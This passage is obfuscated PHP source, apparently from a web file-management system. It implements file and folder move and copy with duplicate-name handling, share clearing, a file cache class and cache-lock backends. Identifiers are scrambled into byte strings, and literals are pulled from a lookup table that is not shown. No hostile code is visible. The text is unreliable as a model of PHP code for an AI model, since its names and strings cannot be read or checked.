strtolower($‚‘ÕÑÉ£[$“ó’µ½…[32]])) { return $‚‘ÕÑÉ£[$“ó’µ½…[402]]; } } return !1; } private function fileNameAutoCache($ÊÁ—Ìä•, $êÈÀÛğ, $»ñ’«øæ, $ù ¨Øı›) { $ÖÖ„ëşî =& $_SERVER[Îûáû“ş]; $­¡Ë’ğŠ = $this->_childrenList($ÊÁ—Ìä•); $¾«î¨Ùà = array_to_keyvalue($­¡Ë’ğŠ, $ÖÖ„ëşî[12], $ÖÖ„ëşî[32]); return $this->fileNameAutoGet($¾«î¨Ùà, $êÈÀÛğ, $»ñ’«øæ, $ù ¨Øı›); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($­‰¨Öƒ, $ÎõçêÁ±, $‹Ş¡»…ñ = REPEAT_REPLACE, $©õø‰Ëİ = '') { $É“ºœìø =& $_SERVER[Îûáû“ş]; $ µïüÁ = $this->sourceInfo($­‰¨Öƒ); $«›´´¥… = $this->sourceInfo($ÎõçêÁ±); if ($ µïüÁ[$É“ºœìø[432]] == $«›´´¥…[$É“ºœìø[402]]) { if ($ µïüÁ[$É“ºœìø[431]] == $É“ºœìø[88]) { Model($É“ºœìø[429])->restore(array($­‰¨Öƒ)); } if (!$©õø‰Ëİ || $©õø‰Ëİ == $ µïüÁ[$É“ºœìø[32]]) { return $­‰¨Öƒ; } } $Ïºé”¬ = $this->pathInfoMore($­‰¨Öƒ); if ($this->isParentOf($­‰¨Öƒ, $ÎõçêÁ±)) { return !1; } if (!$ µïüÁ || !$«›´´¥… || $«›´´¥…[$É“ºœìø[410]] != $É“ºœìø[88]) { return !1; } Hook::trigger($É“ºœìø[586], $Ïºé”¬); $this->targetIsDelete = intval($ µïüÁ[$É“ºœìø[431]]); if ($ µïüÁ[$É“ºœìø[432]] == $ÎõçêÁ± && $©õø‰Ëİ != $ µïüÁ[$É“ºœìø[32]]) { $äıñÎ» = $this->fileNameExist($ÎõçêÁ±, $©õø‰Ëİ); if ($äıñÎ» && $ µïüÁ[$É“ºœìø[410]] == $É“ºœìø[198]) { $…„‡‰¶ = $this->sourceInfo($äıñÎ»); $µ¡†Àç“ = $this->fileHistory($…„‡‰¶, $ µïüÁ[$É“ºœìø[468]], $ µïüÁ[$É“ºœìø[76]]); if (!$µ¡†Àç“) { Model($É“ºœìø[471])->remove($ µïüÁ[$É“ºœìø[468]]); } $this->removeNow($­‰¨Öƒ, !1); $this->folderSizeReset($ÎõçêÁ±); Hook::trigger($É“ºœìø[587], $Ïºé”¬); return $äıñÎ»; } } $–´ÒÛ¨× = $©õø‰Ëİ ? $©õø‰Ëİ : $ µïüÁ[$É“ºœìø[32]]; $this->lockMoveStart($­‰¨Öƒ); $this->lockWriteStart($ÎõçêÁ±, $–´ÒÛ¨×); $šÙÑã¿Ö = array($É“ºœìø[557] => array(), $É“ºœìø[588] => !1); $this->clearShare($­‰¨Öƒ, $ÎõçêÁ±); $É‰ÇùË¬ = $this->fileNameExistCache($ÎõçêÁ±, $ µïüÁ[$É“ºœìø[32]]); $¢…§òŠË = $this->_move($­‰¨Öƒ, $ÎõçêÁ±, $‹Ş¡»…ñ, $šÙÑã¿Ö, $©õø‰Ëİ); $this->sourceCacheClear(); if ($ µïüÁ[$É“ºœìø[410]] == $É“ºœìø[88] && $É‰ÇùË¬) { $this->folderSizeResetChildren($¢…§òŠË); } Model($É“ºœìø[200])->linkAdd($šÙÑã¿Ö[$É“ºœìø[557]]); if ($É‰ÇùË¬ && $šÙÑã¿Ö[$É“ºœìø[588]]) { $this->removeNow($­‰¨Öƒ, !1); } $this->lockMoveEnd($­‰¨Öƒ); $this->lockWriteEnd($ÎõçêÁ±, $–´ÒÛ¨×); $this->folderSizeReset($ µïüÁ[$É“ºœìø[432]]); $this->folderSizeReset($ÎõçêÁ±); $¦×Ñº¿­ = array($ µïüÁ[$É“ºœìø[432]], $ÎõçêÁ±); if ($ µïüÁ[$É“ºœìø[410]] == $É“ºœìø[88]) { $¦×Ñº¿­[] = $­‰¨Öƒ; } $this->updateModifyTime($¦×Ñº¿­); Model($É“ºœìø[561])->eventMove($­‰¨Öƒ, $ µïüÁ[$É“ºœìø[432]], $ÎõçêÁ±); Hook::trigger($É“ºœìø[587], $Ïºé”¬); return $¢…§òŠË; } private function _move($’·‘Ğ€ä, $”ú£Â, $³¢Òßâ¤, &$§½¸åäú, $³µ†«ı = '') { $¾õšÍæø =& $_SERVER[Îûáû“ş]; $­àİ†§š = $this->sourceInfo($’·‘Ğ€ä); $’¥¢ù™å = $­àİ†§š[$¾õšÍæø[410]] == $¾õšÍæø[88]; $ë›…ù¿° = $³µ†«ı ? $³µ†«ı : $­àİ†§š[$¾õšÍæø[32]]; $ûàá–ªÀ = $this->fileNameExistCache($”ú£Â, $ë›…ù¿°); $this->lockMoveStart($’·‘Ğ€ä); $this->lockWriteStart($”ú£Â, $ë›…ù¿°); if (!$ûàá–ªÀ) { return $this->_moveForce($’·‘Ğ€ä, $”ú£Â, $ë›…ù¿°); } $°Ë¬™ì = $ûàá–ªÀ; $È¯ó›§ = !1; if ($’¥¢ù™å) { if ($³¢Òßâ¤ == REPEAT_RENAME_FOLDER) { $ë›…ù¿° = $this->fileNameAuto($”ú£Â, $ë›…ù¿°, $³¢Òßâ¤, $’¥¢ù™å); $°Ë¬™ì = $this->_moveForce($’·‘Ğ€ä, $”ú£Â, $ë›…ù¿°); } else { if ($³¢Òßâ¤ == REPEAT_RENAME_FOLDER) { $³¢Òßâ¤ = REPEAT_RENAME; } $Òèää§ú = $this->_childrenListSelect($’·‘Ğ€ä); foreach ($Òèää§ú as $¿½¤‚Îş) { $this->_move($¿½¤‚Îş[$¾õšÍæø[402]], $ûàá–ªÀ, $³¢Òßâ¤, $§½¸åäú); } $È¯ó›§ = !0; } } else { if ($³¢Òßâ¤ == REPEAT_SKIP) { $È¯ó›§ = !0; } else { if ($³¢Òßâ¤ == REPEAT_RENAME || $³¢Òßâ¤ == REPEAT_RENAME_FOLDER) { $ë›…ù¿° = $this->fileNameAuto($”ú£Â, $ë›…ù¿°, $³¢Òßâ¤, $’¥¢ù™å); $°Ë¬™ì = $this->_moveForce($’·‘Ğ€ä, $”ú£Â, $ë›…ù¿°); } else { if ($³¢Òßâ¤ == REPEAT_REPLACE) { $â˜‰üê‡ = $this->sourceInfoCache($ûàá–ªÀ); $ö©Ç†¨ = $this->fileHistory($â˜‰üê‡, $­àİ†§š[$¾õšÍæø[468]], $­àİ†§š[$¾õšÍæø[76]]); $È¯ó›§ = !0; if ($ö©Ç†¨) { $§½¸åäú[$¾õšÍæø[557]][] = $­àİ†§š[$¾õšÍæø[468]]; } } } } } if ($È¯ó›§ && !$§½¸åäú[$¾õšÍæø[588]]) { $§½¸åäú[$¾õšÍæø[588]] = !0; } return $°Ë¬™ì; } private function _moveForce($ÓÂã , $ÏøœÌ¬ò, $’¢£Äé“) { $â½âİÈÊ =& $_SERVER[Îûáû“ş]; $îô§é‰¨ = $this->sourceInfo($ÓÂã ); $–ÒÅ¼Üû = $this->sourceInfo($ÏøœÌ¬ò); $Àôˆµé· = $îô§é‰¨[$â½âİÈÊ[410]] == $â½âİÈÊ[88]; $×ê¦×´ = array($â½âİÈÊ[401] => $–ÒÅ¼Üû[$â½âİÈÊ[402]], $â½âİÈÊ[580] => $–ÒÅ¼Üû[$â½âİÈÊ[511]] . $–ÒÅ¼Üû[$â½âİÈÊ[402]] . $â½âİÈÊ[50], $â½âİÈÊ[576] => $–ÒÅ¼Üû[$â½âİÈÊ[411]], $â½âİÈÊ[577] => $–ÒÅ¼Üû[$â½âİÈÊ[496]], $â½âİÈÊ[579] => USER_ID, $â½âİÈÊ[420] => $’¢£Äé“); $®¹ÂñÂË = $îô§é‰¨[$â½âİÈÊ[411]] == SourceModel::TYPE_GROUP && $–ÒÅ¼Üû[$â½âİÈÊ[411]] == SourceModel::TYPE_GROUP && $îô§é‰¨[$â½âİÈÊ[496]] == $–ÒÅ¼Üû[$â½âİÈÊ[496]]; if (!$®¹ÂñÂË && $this->moveClearAuth) { Model($â½âİÈÊ[493])->authClear($ÓÂã ); } $§ó•¦ğ = $îô§é‰¨[$â½âİÈÊ[431]] == $â½âİÈÊ[88] && $–ÒÅ¼Üû[$â½âİÈÊ[431]] != $â½âİÈÊ[88]; if ($§ó•¦ğ) { $×ê¦×´[$â½âİÈÊ[430]] = 0; } if ($Àôˆµé·) { $¯Å‘²Œ = array($â½âİÈÊ[580] => array($â½âİÈÊ[540], $îô§é‰¨[$â½âİÈÊ[511]] . $îô§é‰¨[$â½âİÈÊ[402]] . $â½âİÈÊ[541])); $áš”‡£ì = $îô§é‰¨[$â½âİÈÊ[511]] . $îô§é‰¨[$â½âİÈÊ[402]] . $â½âİÈÊ[50]; $á¤¤îÎğ = $–ÒÅ¼Üû[$â½âİÈÊ[511]] . $–ÒÅ¼Üû[$â½âİÈÊ[402]] . $â½âİÈÊ[50] . $îô§é‰¨[$â½âİÈÊ[402]] . $â½âİÈÊ[50]; $†æóüëÔ = array($â½âİÈÊ[580] => array($â½âİÈÊ[589], "\x72\145\x70\154\x61\x63\x65\x28\160\141\162\x65\x6e\x74\x4c\145\166\x65\x6c\x2c\47{$áš”‡£ì}\47\x2c\x27{$á¤¤îÎğ}\47\51"), $â½âİÈÊ[576] => $–ÒÅ¼Üû[$â½âİÈÊ[411]], $â½âİÈÊ[577] => $–ÒÅ¼Üû[$â½âİÈÊ[496]]); if ($§ó•¦ğ) { $†æóüëÔ[$â½âİÈÊ[430]] = 0; } $this->where($¯Å‘²Œ)->data($†æóüëÔ)->save(); } $this->where(array($â½âİÈÊ[417] => $ÓÂã ))->data($×ê¦×´)->save(); return $ÓÂã ; } private function clearShare($’ÕÈ€¡«, $Ø£ˆâ) { $¼Ã»¶£ =& $_SERVER[Îûáû“ş]; $ÓÑãùÎ = $this->sourceInfo($’ÕÈ€¡«); $›©ÛËù = $this->sourceInfo($Ø£ˆâ); if ($ÓÑãùÎ[$¼Ã»¶£[496]] == $›©ÛËù[$¼Ã»¶£[496]] && $ÓÑãùÎ[$¼Ã»¶£[411]] == $¼Ã»¶£[590]) { return; } $øìĞÁº = array($¼Ã»¶£[511] => array($¼Ã»¶£[540], $ÓÑãùÎ[$¼Ã»¶£[511]] . $’ÕÈ€¡« . $¼Ã»¶£[541])); $ÃÎÄòÑ = $this->field($¼Ã»¶£[417])->where($øìĞÁº)->getField($¼Ã»¶£[402], !0); if (!$ÃÎÄòÑ) { return; } $øìĞÁº = array($¼Ã»¶£[402] => array($¼Ã»¶£[7], $ÃÎÄòÑ), $¼Ã»¶£[591] => 1); $´„î¿Åº = Model($¼Ã»¶£[592])->field($¼Ã»¶£[593])->where($øìĞÁº)->select(); if (!$´„î¿Åº) { return; } $´„î¿Åº = array_to_keyvalue($´„î¿Åº, $¼Ã»¶£[12], $¼Ã»¶£[593]); $øìĞÁº = array($¼Ã»¶£[593] => array($¼Ã»¶£[7], $´„î¿Åº)); Model($¼Ã»¶£[592])->where($øìĞÁº)->save(array($¼Ã»¶£[591] => 0)); Model($¼Ã»¶£[594])->where($øìĞÁº)->delete(); } public function copyFolderFromIO($õû·¼­‰, $ñ€–Ö¨¹, $¼²îûğ•, $­‰í¯Ôï, $ˆßÉ•“, $ĞÁÚ¨Ëº = false) { $Ç•ÜûÓâ =& $_SERVER[Îûáû“ş]; $‘ËÇÙÄÔ = array($Ç•ÜûÓâ[558] => array(), $Ç•ÜûÓâ[559] => array(), $Ç•ÜûÓâ[557] => array(), $Ç•ÜûÓâ[595] => array()); $·ğÆ…—˜ = $ĞÁÚ¨Ëº ? $ĞÁÚ¨Ëº : $õû·¼­‰->pathThis($ñ€–Ö¨¹); $ÌÈìú³ = $this->fileNameExist($¼²îûğ•, $·ğÆ…—˜); $¾¤©—÷³ = $this->mkdir($¼²îûğ•, $·ğÆ…—˜, $­‰í¯Ôï); if (!$ÌÈìú³ || $­‰í¯Ôï == REPEAT_RENAME_FOLDER) { $­‰í¯Ôï = !1; } if ($ÌÈìú³) { $this->_childrenAllMake($ÌÈìú³); } Hook::trigger($Ç•ÜûÓâ[596]); $this->_copyChildTo($õû·¼­‰, $ñ€–Ö¨¹, $¾¤©—÷³, $­‰í¯Ôï, $‘ËÇÙÄÔ, $ˆßÉ•“); Hook::trigger($Ç•ÜûÓâ[597]); if ($¾¤©—÷³) { $this->folderSizeResetChildren($¾¤©—÷³); } $this->_childrenListClear(); Model($Ç•ÜûÓâ[560])->addAll($‘ËÇÙÄÔ[$Ç•ÜûÓâ[558]], array(), !0); Model($Ç•ÜûÓâ[561])->eventCopy($¾¤©—÷³); $this->saveAll($‘ËÇÙÄÔ[$Ç•ÜûÓâ[559]]); Model($Ç•ÜûÓâ[471])->linkAdd($‘ËÇÙÄÔ[$Ç•ÜûÓâ[557]]); Model($Ç•ÜûÓâ[471])->remove($‘ËÇÙÄÔ[$Ç•ÜûÓâ[595]]); $this->folderSizeReset($¼²îûğ•); $this->updateModifyTime($¼²îûğ•); return $¾¤©—÷³; } private function _copyChildTo($ ä²ºÛØ, $Œ›Ğ, $¤÷á§, $êÎç¥×ì, &$²™Ù†Ğ, $œ©‹˜œé) { $Ç—£ˆ“ =& $_SERVER[Îûáû“ş]; $ ’ç‚“ = $this->sourceInfoCache($¤÷á§); $š¬ãõà„ = $ ä²ºÛØ->listPath($Œ›Ğ); $š¬ãõà„ = $š¬ãõà„ ? $š¬ãõà„ : array($Ç—£ˆ“[83] => array(), $Ç—£ˆ“[82] => array()); $â“©Òæ = array_merge($š¬ãõà„[$Ç—£ˆ“[83]], $š¬ãõà„[$Ç—£ˆ“[82]]); $³ìØêÓ = $this->_addFiles($ ä²ºÛØ, $š¬ãõà„[$Ç—£ˆ“[83]], $œ©‹˜œé); $´øºµÆ‘ = array(); foreach ($â“©Òæ as &$›ÓİØºÍ) { if (isset($³ìØêÓ[$›ÓİØºÍ[$Ç—£ˆ“[32]]])) { $›ÓİØºÍ = $³ìØêÓ[$›ÓİØºÍ[$Ç—£ˆ“[32]]]; } $›ÓİØºÍ[$Ç—£ˆ“[410]] = $›ÓİØºÍ[$Ç—£ˆ“[33]] == $Ç—£ˆ“[75]; $›ÓİØºÍ[$Ç—£ˆ“[412]] = substr(_get($›ÓİØºÍ, $Ç—£ˆ“[174], $Ç—£ˆ“[12]), 0, 10); $›ÓİØºÍ[$Ç—£ˆ“[76]] = _get($›ÓİØºÍ, $Ç—£ˆ“[76], 0); $›ÓİØºÍ[$Ç—£ˆ“[468]] = _get($›ÓİØºÍ, $Ç—£ˆ“[468], 0); if (!isset($›ÓİØºÍ[$Ç—£ˆ“[598]]) && $›ÓİØºÍ[$Ç—£ˆ“[468]]) { $²™Ù†Ğ[$Ç—£ˆ“[595]][] = $›ÓİØºÍ[$Ç—£ˆ“[468]]; } if ($êÎç¥×ì) { $ÏòÁ†®× = $this->fileNameExistCache($¤÷á§, $›ÓİØºÍ[$Ç—£ˆ“[32]]); if ($ÏòÁ†®×) { if ($›ÓİØºÍ[$Ç—£ˆ“[410]] || $êÎç¥×ì == REPEAT_SKIP) { continue; } if ($êÎç¥×ì == REPEAT_REPLACE) { $×€ôôÖÄ = $this->sourceInfoCache($ÏòÁ†®×); $šé„Ã® = $this->fileHistory($×€ôôÖÄ, $›ÓİØºÍ[$Ç—£ˆ“[468]], $›ÓİØºÍ[$Ç—£ˆ“[76]]); if ($šé„Ã®) { $²™Ù†Ğ[$Ç—£ˆ“[557]][] = $›ÓİØºÍ[$Ç—£ˆ“[468]]; } continue; } else { if ($êÎç¥×ì == REPEAT_RENAME) { $›ÓİØºÍ[$Ç—£ˆ“[32]] = $this->fileNameAutoCache($¤÷á§, $›ÓİØºÍ[$Ç—£ˆ“[32]], $êÎç¥×ì, !1); } } } } if (!$›ÓİØºÍ[$Ç—£ˆ“[410]] && $›ÓİØºÍ[$Ç—£ˆ“[468]] == 0) { continue; } if (!$›ÓİØºÍ[$Ç—£ˆ“[410]] && $›ÓİØºÍ[$Ç—£ˆ“[468]]) { $²™Ù†Ğ[$Ç—£ˆ“[557]][] = $›ÓİØºÍ[$Ç—£ˆ“[468]]; } $´øºµÆ‘[] = $this->_makeItemData($›ÓİØºÍ, $ ’ç‚“, $›ÓİØºÍ[$Ç—£ˆ“[32]]); } unset($›ÓİØºÍ); if (!empty($´øºµÆ‘)) { $this->addAll($´øºµÆ‘); $this->_childrenListSelect($¤÷á§); } $ı·ÀºÌ = $this->_childrenList($¤÷á§); $ı·ÀºÌ = array_to_keyvalue($ı·ÀºÌ, $Ç—£ˆ“[32]); foreach ($â“©Òæ as $›ÓİØºÍ) { $×€ôôÖÄ = $ı·ÀºÌ[$›ÓİØºÍ[$Ç—£ˆ“[32]]]; $°ÓÒà¾ = $×€ôôÖÄ[$Ç—£ˆ“[402]]; $this->_copyApplyMeta($×€ôôÖÄ, $²™Ù†Ğ); if ($›ÓİØºÍ[$Ç—£ˆ“[33]] == $Ç—£ˆ“[75]) { $›ÓİØºÍ[$Ç—£ˆ“[84]] = $ ä²ºÛØ->getPathInner($›ÓİØºÍ[$Ç—£ˆ“[84]]); $this->_copyChildTo($ ä²ºÛØ, $›ÓİØºÍ[$Ç—£ˆ“[84]], $°ÓÒà¾, $êÎç¥×ì, $²™Ù†Ğ, $œ©‹˜œé); } } } private function _addFiles($Ö¿€¹ş², $ ÖóÚéé, $ûÄû÷Ñ) { $Ï£Ÿ¿ìí =& $_SERVER[Îûáû“ş]; if (!$ ÖóÚéé || count($ ÖóÚéé) == 0) { return array(); } $Ä±ãËğÓ = array(); foreach ($ ÖóÚéé as &$Ñ®«èêÛ) { Hook::trigger($Ï£Ÿ¿ìí[599], $Ñ®«èêÛ); $Ñ®«èêÛ[$Ï£Ÿ¿ìí[84]] = $Ö¿€¹ş²->getPathInner($Ñ®«èêÛ[$Ï£Ÿ¿ìí[84]]); $×·ñ‹× = $Ö¿€¹ş²->hashSimple($Ñ®«èêÛ[$Ï£Ÿ¿ìí[84]]); $²ûÜÓ×± = $Ö¿€¹ş²->hashMd5($Ñ®«èêÛ[$Ï£Ÿ¿ìí[84]]); if (strlen($²ûÜÓ×±) > 10 && !isset($Ä±ãËğÓ[$²ûÜÓ×±])) { $Ä±ãËğÓ[$²ûÜÓ×±] = array(); } $Ñ®«èêÛ[$Ï£Ÿ¿ìí[177]] = $×·ñ‹×; $Ñ®«èêÛ[$Ï£Ÿ¿ìí[176]] = $²ûÜÓ×±; $Ä±ãËğÓ[$²ûÜÓ×±][] =& $Ñ®«èêÛ; if (count($Ä±ãËğÓ[$²ûÜÓ×±]) > 1) { $Ñ®«èêÛ[$Ï£Ÿ¿ìí[598]] = !0; } Hook::trigger($Ï£Ÿ¿ìí[600], $Ñ®«èêÛ); } unset($Ñ®«èêÛ); $¯—½¢“ç = array($Ï£Ÿ¿ìí[176] => array($Ï£Ÿ¿ìí[7], array_keys($Ä±ãËğÓ))); $È–“ìø¥ = Model($Ï£Ÿ¿ìí[601]); $ëıÈõûô = $È–“ìø¥->where($¯—½¢“ç)->select(); $ëıÈõûô = $ëıÈõûô ? $ëıÈõûô : array(); foreach ($ëıÈõûô as $ºÎ‹¹Ú) { if (!isset($Ä±ãËğÓ[$ºÎ‹¹Ú[$Ï£Ÿ¿ìí[176]]])) { continue; } $ßì¯ß×ë = $Ä±ãËğÓ[$ºÎ‹¹Ú[$Ï£Ÿ¿ìí[176]]]; foreach ($ßì¯ß×ë as &$Ñ®«èêÛ) { $Ñ®«èêÛ[$Ï£Ÿ¿ìí[468]] = $ºÎ‹¹Ú[$Ï£Ÿ¿ìí[468]]; $Ñ®«èêÛ[$Ï£Ÿ¿ìí[598]] = !0; } unset($Ñ®«èêÛ); } $ÚéÑïŸ = array(); foreach ($ ÖóÚéé as $Ù˜âİª ) { Hook::trigger($Ï£Ÿ¿ìí[602], $Ù˜âİª ); if (isset($Ù˜âİª [$Ï£Ÿ¿ìí[598]]) && $Ù˜âİª [$Ï£Ÿ¿ìí[598]]) { Hook::trigger($Ï£Ÿ¿ìí[603], $Ù˜âİª ); continue; } $È¢ìøÚ = $Ö¿€¹ş²->getPathInner($Ù˜âİª [$Ï£Ÿ¿ìí[84]]); $¯»óÏä = $È–“ìø¥->addFileMake($È¢ìøÚ, $Ù˜âİª [$Ï£Ÿ¿ìí[76]], $Ù˜âİª [$Ï£Ÿ¿ìí[177]], $Ù˜âİª [$Ï£Ÿ¿ìí[176]], $Ù˜âİª [$Ï£Ÿ¿ìí[32]], $ûÄû÷Ñ); Hook::trigger($Ï£Ÿ¿ìí[603], $Ù˜âİª ); if (!is_array($¯»óÏä)) { continue; } $ÚéÑïŸ[] = $¯»óÏä; } $È–“ìø¥->addAll($ÚéÑïŸ); $¯—½¢“ç = array($Ï£Ÿ¿ìí[176] => array($Ï£Ÿ¿ìí[7], array_keys($Ä±ãËğÓ))); $ëıÈõûô = $È–“ìø¥->where($¯—½¢“ç)->select(); $ëıÈõûô = $ëıÈõûô ? $ëıÈõûô : array(); foreach ($ëıÈõûô as $ºÎ‹¹Ú) { if (!isset($Ä±ãËğÓ[$ºÎ‹¹Ú[$Ï£Ÿ¿ìí[176]]])) { continue; } $Òå”€æÂ =& $Ä±ãËğÓ[$ºÎ‹¹Ú[$Ï£Ÿ¿ìí[176]]]; foreach ($Òå”€æÂ as &$Ñ®«èêÛ) { $Ñ®«èêÛ[$Ï£Ÿ¿ìí[468]] = $ºÎ‹¹Ú[$Ï£Ÿ¿ìí[468]]; } unset($Ñ®«èêÛ); } $Ÿ•†ö› = array(); foreach ($ ÖóÚéé as $î°Ï“Œ­) { $Ÿ•†ö›[$î°Ï“Œ­[$Ï£Ÿ¿ìí[32]]] = $î°Ï“Œ­; } return $Ÿ•†ö›; } } goto c…è‚™¡Ÿ; A¤Ï½‰÷Áø: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($ãâ“«•”, $äÙİËÇˆ) { $§•¯ˆù” =& $_SERVER[Îûáû“ş]; $this->cachePath = $ãâ“«•”[$§•¯ˆù”[84]]; $this->prefix = $§•¯ˆù”[833]; $this->cacheTime = $äÙİËÇˆ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($ûÊïˆŸ) { $µÎŠÁŠÀ =& $_SERVER[Îûáû“ş]; $ûÊïˆŸ = str_replace(array($µÎŠÁŠÀ[834], $µÎŠÁŠÀ[97], $µÎŠÁŠÀ[73]), $µÎŠÁŠÀ[835], $ûÊïˆŸ); return $this->cachePath . $µÎŠÁŠÀ[836] . $ûÊïˆŸ . $µÎŠÁŠÀ[837]; } public function set($ª†û×¾³, $ºûßœ«³, $ÙÆ¢Üœ© = false) { $ÙÆ¢Üœ© = $ÙÆ¢Üœ© ? $ÙÆ¢Üœ© : $this->cacheTime; $”ØÜï¹ğ = $this->getFile($ª†û×¾³); if (file_put_contents($”ØÜï¹ğ, $this->prefix . $ºûßœ«³, LOCK_EX)) { @touch($”ØÜï¹ğ, intval(time() + $ÙÆ¢Üœ©)); clearstatcache(); return !0; } @unlink($”ØÜï¹ğ); return !1; } public function get($µªøÖ Ü) { $¾µ¾ş·µ = $this->getFile($µªøÖ Ü); if (file_exists($¾µ¾ş·µ) && filemtime($¾µ¾ş·µ) < time()) { @unlink($¾µ¾ş·µ); return !1; } $îÔÆîçÇ = @file_get_contents($¾µ¾ş·µ); return substr($îÔÆîçÇ, strlen($this->prefix)); } public function remove($å³÷˜××) { $—Ù¶µí¡ = $this->getFile($å³÷˜××); return @unlink($—Ù¶µí¡); } public function deleteAll() { $Ú­»· =& $_SERVER[Îûáû“ş]; $ÔúŞ¦ç‘ = scandir($this->cachePath); foreach ($ÔúŞ¦ç‘ as $œÜ³Åæœ) { $ÅÑÁ •™ = $this->cachePath . $œÜ³Åæœ; if (strpos($ÅÑÁ •™, $Ú­»·[837]) && strpos($ÅÑÁ •™, $Ú­»·[838])) { @unlink($ÅÑÁ •™); } } } public function clearTimeout() { $÷¸ØÆ° =& $_SERVER[Îûáû“ş]; $âÏØ‰×² = scandir($this->cachePath); foreach ($âÏØ‰×² as $¨µÇŠøç) { $€çÇô‹û = $this->cachePath . $¨µÇŠøç; if (strpos($€çÇô‹û, $÷¸ØÆ°[837]) && strpos($€çÇô‹û, $÷¸ØÆ°[838]) && filemtime($€çÇô‹û) < time()) { @unlink($€çÇô‹û); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $äÉÎˆµ£ =& $_SERVER[Îûáû“ş]; if (self::$handle) { return self::$handle; } $Î´¤Á = $GLOBALS[$äÉÎˆµ£[6]][$äÉÎˆµ£[349]]; self::$timeout = $Î´¤Á[$äÉÎˆµ£[839]] ? $Î´¤Á[$äÉÎˆµ£[839]] : 10; $Ì­èÇçâ = _get($GLOBALS[$äÉÎˆµ£[6]], $äÉÎˆµ£[840]); $¦¿–¥‚ = $Î´¤Á[$äÉÎˆµ£[826]] ? $Î´¤Á[$äÉÎˆµ£[826]] : $äÉÎˆµ£[200]; if ($¦¿–¥‚ == $äÉÎˆµ£[21] && $Ì­èÇçâ == $äÉÎˆµ£[13]) { $¦¿–¥‚ = $äÉÎˆµ£[200]; } switch ($¦¿–¥‚) { case $äÉÎˆµ£[829]: self::$handle = new CacheLockRedis(); break; case $äÉÎˆµ£[830]: self::$handle = new CacheLockMemcached(); break; case $äÉÎˆµ£[21]: self::$handle = new CacheLockDatabase(); break; case $äÉÎˆµ£[200]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($äÉÎˆµ£[841], $äÉÎˆµ£[842]); } return self::$handle; } private static function key($õËÊÖÎâ) { return $_SERVER[Îûáû“ş][843] . Cache::key($õËÊÖÎâ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($šÓ·Â¾¹ = '') { self::$errorMsg = $šÓ·Â¾¹; } public static function lockGlobal($ õ‚—–Î, $ŸÄ„ó¹½) { return self::lock($ õ‚—–Î, $ŸÄ„ó¹½, !0); } public static function lock($ªä¨Õ±ä, $±˜ù½Á = false, $éà»‚²ø = false) { $Åç¦ëá± =& $_SERVER[Îûáû“ş]; $®’•Éš = self::init(); $°ÌîÍÎ´ = self::key($ªä¨Õ±ä); $±˜ù½Á = $±˜ù½Á ? $±˜ù½Á : self::$timeout; $ó„·€È = timeFloat(); $¢ğÍ¾‹Š = $®’•Éš->lock($°ÌîÍÎ´, $±˜ù½Á); $×Á·ğ°ª = timeFloat(); if (!$¢ğÍ¾‹Š) { $åº³†ş¿ = "\154\x6f\143\x6b\40\x65\162\162\x6f\162\x3b\153\145\x79\75{$ªä¨Õ±ä}\x3b\164\x69\155\x65\x3d{$±˜ù½Á}\x3b" . self::$errorMsg . $Åç¦ëá±[71] . get_caller_msg(); $àÄ•÷›¡ = LNG($Åç¦ëá±[844]) . "\x28{$±˜ù½Á}\x73\51\56" . LNG($Åç¦ëá±[845]); $àÄ•÷›¡ .= $Åç¦ëá±[846]; if (is_string(self::$errorMsg) && self::$errorMsg) { $àÄ•÷›¡ = $àÄ•÷›¡ . $Åç¦ëá±[847] . self::$errorMsg; } write_log($Åç¦ëá±[848] . sprintf($Åç¦ëá±[849], timeFloat() - $ó„·€È) . $Åç¦ëá±[850] . $åº³†ş¿ . $Åç¦ëá±[851] . error_get_last(), $Åç¦ëá±[842]); show_json($àÄ•÷›¡, !1); } if (!$éà»‚²ø) { self::$lockItem[$°ÌîÍÎ´] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $§¤’ÚØŸ = number_format(timeFloat() - $×Á·ğ°ª, 3); write_log($Åç¦ëá±[852] . $ªä¨Õ±ä . $Åç¦ëá±[853] . $§¤’ÚØŸ, $Åç¦ëá±[842]); } return $¢ğÍ¾‹Š; } public static function lockGet($õüÈˆ§â) { $àè¦å„ = self::key($õüÈˆ§â); if (self::$lockItem[$àè¦å„]) { return self::$lockItem[$àè¦å„]; } return self::init()->lockGet($àè¦å„); } public static function unlock($›É¼¯”Ö) { $§¡Æ÷ŠÚ =& $_SERVER[Îûáû“ş]; $ã™è€•è = self::key($›É¼¯”Ö); self::$lockItem[$ã™è€•è] = null; self::init()->unlock($ã™è€•è); if (GLOBAL_DEBUG_LOG_ALL) { write_log($§¡Æ÷ŠÚ[854] . $›É¼¯”Ö, $§¡Æ÷ŠÚ[842]); } return; } public static function unlockRuntime() { $ÌŒòÊ»º =& $_SERVER[Îûáû“ş]; $æ½Ä¡Œ‚ = self::init(); $Ä…€éîí = !1; foreach (self::$lockItem as $Œõø¬î¼ => $ÇÂïÔ ) { if (!$ÇÂïÔ ) { continue; } $æ½Ä¡Œ‚->unlock($Œõø¬î¼); if (!$Ä…€éîí) { $Ä…€éîí = !0; write_log($ÌŒòÊ»º[855] . $Œõø¬î¼ . $ÌŒòÊ»º[71] . get_caller_msg(), $ÌŒòÊ»º[842]); continue; } write_log($ÌŒòÊ»º[855] . $Œõø¬î¼, $ÌŒòÊ»º[842]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $ÂèÆÕ„« = number_format(timeFloat() - TIME_FLOAT, 3); write_log($ÌŒòÊ»º[856] . $ÂèÆÕ„« . $ÌŒòÊ»º[857] . ACTION, $ÌŒòÊ»º[842]); } } public static function fileLock($¸»²Ìæú) { $Šï€¥ß¹ =& $_SERVER[Îûáû“ş]; if (!$GLOBALS[$Šï€¥ß¹[858]]) { $GLOBALS[$Šï€¥ß¹[858]] = array(); } $GLOBALS[$Šï€¥ß¹[858]][$¸»²Ìæú] = !1; $œ‘çıÖ„ = fopen(DATA_PATH . 